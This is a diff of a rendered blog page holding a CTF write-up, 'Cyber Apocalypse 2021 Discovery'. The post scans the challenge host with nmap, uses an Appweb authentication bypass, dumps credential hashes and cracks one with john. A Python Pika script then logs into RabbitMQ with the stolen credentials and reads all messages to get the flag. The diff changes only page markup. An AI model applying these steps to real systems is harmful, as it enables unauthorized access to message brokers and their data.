@@ -7,7 +7,7 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.89.4" />
+<meta name="generator" content="Hugo 0.95.0" />
 
 <link rel="canonical" href="https://thalium.github.io/blog/posts/apocalypse2021-discovery/">
 <meta property="og:title" content="Cyber Apocalypse 2021 4/5 - Discovery" />
@@ -168,34 +168,34 @@ if (!doNotTrack) {
 <li>an HTTP server, requesting an authentication</li>
 <li>an AMQP broker, <code>rabbitmq</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -sT -p 30476,30042 -sV -sC -n -Pn 138.68.182.108
-PORT      STATE SERVICE VERSION
-30042/tcp open  http	?
-...
-30476/tcp open  amqp    RabbitMQ 3.8.2 <span style="color:#f92672">(</span>0-9<span style="color:#f92672">)</span>
-| amqp-info: 
-|   capabilities: 
-|     publisher_confirms: YES
-|     exchange_exchange_bindings: YES
-|     basic.nack: YES
-|     consumer_cancel_notify: YES
-|     connection.blocked: YES
-|     consumer_priorities: YES
-|     authentication_failure_close: YES
-|     per_consumer_qos: YES
-|     direct_reply_to: YES
-|   cluster_name: rabbit@hwcadiscovery-9130-689c6f9d5d-sbf2f
-|   copyright: Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2007-2019 Pivotal Software, Inc.
-|   information: Licensed under the MPL 1.1. Website: https://rabbitmq.com
-|   platform: Erlang/OTP 22.2.7
-|   product: RabbitMQ
-|   version: 3.8.2
-|   mechanisms: PLAIN AMQPLAIN
-|_  locales: en_US
-</code></pre></div><p>The web part is rather awkward, as it keeps returning <code>HTTP 401</code> asking for authentication credentials. The message bus part is not that friendly either, as it requires to authenticate too. Crawling has not helped a lot, and bruteforcing looks rather inefficient for a CTF. <strong>So what else to do ?</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap -sT -p 30476,30042 -sV -sC -n -Pn 138.68.182.108
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>30042/tcp open  http	?
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>30476/tcp open  amqp    RabbitMQ 3.8.2 <span style="color:#f92672">(</span>0-9<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| amqp-info: 
+</span></span><span style="display:flex;"><span>|   capabilities: 
+</span></span><span style="display:flex;"><span>|     publisher_confirms: YES
+</span></span><span style="display:flex;"><span>|     exchange_exchange_bindings: YES
+</span></span><span style="display:flex;"><span>|     basic.nack: YES
+</span></span><span style="display:flex;"><span>|     consumer_cancel_notify: YES
+</span></span><span style="display:flex;"><span>|     connection.blocked: YES
+</span></span><span style="display:flex;"><span>|     consumer_priorities: YES
+</span></span><span style="display:flex;"><span>|     authentication_failure_close: YES
+</span></span><span style="display:flex;"><span>|     per_consumer_qos: YES
+</span></span><span style="display:flex;"><span>|     direct_reply_to: YES
+</span></span><span style="display:flex;"><span>|   cluster_name: rabbit@hwcadiscovery-9130-689c6f9d5d-sbf2f
+</span></span><span style="display:flex;"><span>|   copyright: Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2007-2019 Pivotal Software, Inc.
+</span></span><span style="display:flex;"><span>|   information: Licensed under the MPL 1.1. Website: https://rabbitmq.com
+</span></span><span style="display:flex;"><span>|   platform: Erlang/OTP 22.2.7
+</span></span><span style="display:flex;"><span>|   product: RabbitMQ
+</span></span><span style="display:flex;"><span>|   version: 3.8.2
+</span></span><span style="display:flex;"><span>|   mechanisms: PLAIN AMQPLAIN
+</span></span><span style="display:flex;"><span>|_  locales: en_US
+</span></span></code></pre></div><p>The web part is rather awkward, as it keeps returning <code>HTTP 401</code> asking for authentication credentials. The message bus part is not that friendly either, as it requires to authenticate too. Crawling has not helped a lot, and bruteforcing looks rather inefficient for a CTF. <strong>So what else to do ?</strong></p>
 <p>We picked an HTTP response and took a closer look at it:</p>
 <pre tabindex="0"><code>...
-WWW-Authenticate: realm=&quot;appweb_control_panel&quot;,...,opaque=&quot;799d5&quot;...
+WWW-Authenticate: realm=&#34;appweb_control_panel&#34;,...,opaque=&#34;799d5&#34;...
 ...
 </code></pre><p>Googling <code>appweb</code> is not the safest bet, but googling <code>opaque=&quot;799d5&quot;</code> rapidly returns a <a href="https://www.programmersought.com/article/16096870398/">good candidate</a>.</p>
 <p>Digging a bit, we find out two more things:</p>
@@ -204,18 +204,18 @@ WWW-Authenticate: realm=&quot;appweb_control_panel&quot;,...,opaque=&quot;799d5&
 <li>a github reference to the <a href="https://github.com/embedthis/appweb-gpl/blob/master/src/http/httpLib.c#L6063">opaque=&ldquo;799d5&rdquo;</a></li>
 </ul>
 <p>Running the exploit against the target works, and allows to access to the content associated with <code>/</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">Plane Control Panel
-Panel which monitors the sensor readings and other controls.
-
-List of sensors
-Perimeter Detection
-Radiation Control
-Location Tracker
-RabbitMQ Access
-Exchange    Type    Username    Password Hash    Host    Routing Key    Queue
-Direct    anthony_davis    89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1    /        
-Base    Topic    leo    27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99    / 
-</code></pre></div><p>Recalling that we have access to a rabbitmq instance, we can now turn those credentials to access to the AMQP broker, and possibly retrieve some messages.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Plane Control Panel
+</span></span><span style="display:flex;"><span>Panel which monitors the sensor readings and other controls.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>List of sensors
+</span></span><span style="display:flex;"><span>Perimeter Detection
+</span></span><span style="display:flex;"><span>Radiation Control
+</span></span><span style="display:flex;"><span>Location Tracker
+</span></span><span style="display:flex;"><span>RabbitMQ Access
+</span></span><span style="display:flex;"><span>Exchange    Type    Username    Password Hash    Host    Routing Key    Queue
+</span></span><span style="display:flex;"><span>Direct    anthony_davis    89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1    /        
+</span></span><span style="display:flex;"><span>Base    Topic    leo    27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99    / 
+</span></span></code></pre></div><p>Recalling that we have access to a rabbitmq instance, we can now turn those credentials to access to the AMQP broker, and possibly retrieve some messages.</p>
 <p>Starting <code>john</code> yields <code>SHA256('winniethepooh') = 89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1</code> in a snap. The other hash remains uncracked until today.</p>
 <p>We can verify that we can access to the AMQP broker using these credentials. The lock to the AMQP broker has gone.</p>
 <p>The last step is to peek into the messages flow, using <a href="https://pika.readthedocs.io/en/stable/">Pika</a> as an AMQP client implementation:</p>
@@ -226,42 +226,42 @@ Base    Topic    leo    27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CB
 </ol>
 <p>The associated concepts can be found in <a href="https://www.rabbitmq.com/tutorials/tutorial-five-python.html">rabbitmq documentation associated with topics</a>.</p>
 <p>The script below will yield the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-
-<span style="color:#f92672">from</span> pika <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> product
-
-TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;138.68.182.108&#39;</span>
-PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">30476</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(username, password):
-  creds <span style="color:#f92672">=</span> PlainCredentials(username, password)
-  params <span style="color:#f92672">=</span> ConnectionParameters(TARGET, PORT, <span style="color:#e6db74">&#39;/&#39;</span>, creds)
-  conn <span style="color:#f92672">=</span> BlockingConnection(params)
-  <span style="color:#66d9ef">return</span> conn
-
-conn <span style="color:#f92672">=</span> connect(<span style="color:#e6db74">&#39;anthony_davis&#39;</span>, <span style="color:#e6db74">&#39;winniethepooh&#39;</span>)
-<span style="color:#66d9ef">assert</span>(conn)
-print(conn)
-
-channel <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>channel()
-
-result <span style="color:#f92672">=</span> channel<span style="color:#f92672">.</span>queue_declare(<span style="color:#e6db74">&#39;&#39;</span>, exclusive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-queue_name <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>method<span style="color:#f92672">.</span>queue
-
-channel<span style="color:#f92672">.</span>queue_bind(exchange<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Base&#39;</span>, queue<span style="color:#f92672">=</span>queue_name, routing_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#&#39;</span>)
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">callback</span>(ch, method, properties, body):
-    print(<span style="color:#e6db74">&#34; [x] Received </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> body<span style="color:#f92672">.</span>decode())
-    time<span style="color:#f92672">.</span>sleep(body<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span>))
-    print(<span style="color:#e6db74">&#34; [x] Done&#34;</span>)
-    ch<span style="color:#f92672">.</span>basic_ack(delivery_tag<span style="color:#f92672">=</span>method<span style="color:#f92672">.</span>delivery_tag)
-
-channel<span style="color:#f92672">.</span>basic_consume(queue<span style="color:#f92672">=</span>queue_name, on_message_callback<span style="color:#f92672">=</span>callback, auto_ack<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-
-channel<span style="color:#f92672">.</span>start_consuming()
-</code></pre></div><p>The flag shows up: <code>CHTB{1_h4v3_n0n4m3@_@}</code>.</p> </div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pika <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> product
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;138.68.182.108&#39;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">30476</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(username, password):
+</span></span><span style="display:flex;"><span>  creds <span style="color:#f92672">=</span> PlainCredentials(username, password)
+</span></span><span style="display:flex;"><span>  params <span style="color:#f92672">=</span> ConnectionParameters(TARGET, PORT, <span style="color:#e6db74">&#39;/&#39;</span>, creds)
+</span></span><span style="display:flex;"><span>  conn <span style="color:#f92672">=</span> BlockingConnection(params)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> conn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> connect(<span style="color:#e6db74">&#39;anthony_davis&#39;</span>, <span style="color:#e6db74">&#39;winniethepooh&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span>(conn)
+</span></span><span style="display:flex;"><span>print(conn)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>channel()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> channel<span style="color:#f92672">.</span>queue_declare(<span style="color:#e6db74">&#39;&#39;</span>, exclusive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>queue_name <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>method<span style="color:#f92672">.</span>queue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel<span style="color:#f92672">.</span>queue_bind(exchange<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Base&#39;</span>, queue<span style="color:#f92672">=</span>queue_name, routing_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">callback</span>(ch, method, properties, body):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34; [x] Received </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> body<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(body<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span>))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34; [x] Done&#34;</span>)
+</span></span><span style="display:flex;"><span>    ch<span style="color:#f92672">.</span>basic_ack(delivery_tag<span style="color:#f92672">=</span>method<span style="color:#f92672">.</span>delivery_tag)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel<span style="color:#f92672">.</span>basic_consume(queue<span style="color:#f92672">=</span>queue_name, on_message_callback<span style="color:#f92672">=</span>callback, auto_ack<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel<span style="color:#f92672">.</span>start_consuming()
+</span></span></code></pre></div><p>The flag shows up: <code>CHTB{1_h4v3_n0n4m3@_@}</code>.</p> </div>
     <footer class="post-footer">
 
   <div class="post-footer-data">
